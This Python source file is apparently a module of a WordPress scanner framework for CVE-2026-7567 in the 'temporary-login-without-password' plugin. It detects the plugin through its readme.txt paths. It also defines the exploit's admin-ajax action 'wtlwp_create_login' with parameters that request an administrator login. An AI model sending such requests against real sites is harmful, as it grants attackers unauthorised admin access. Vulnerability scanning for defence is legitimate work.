# Made by Sn0w8ird

from __future__ import annotations

from cpointed.core.engine import ScanResult, Target
from cpointed.modules.wordpress.base import WordPressModule


class CVE20267567TemporaryLogin(WordPressModule):
    name = "CVE-2026-7567"
    severity = 9.8
    affected_versions = ["temporary-login-without-password: verify against vendor advisory"]
    cwe = "CWE-287 (context-specific)"
    plugin_readme_paths = (
        "/wp-content/plugins/temporary-login-without-password/readme.txt",
        "/wp-content/plugins/temporary-login/readme.txt",
    )
    slug_hint = "temporary"
    exploit_admin_ajax_action = "wtlwp_create_login"
    exploit_ajax_extra_fields = {"duration": "hour", "role": "administrator"}

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
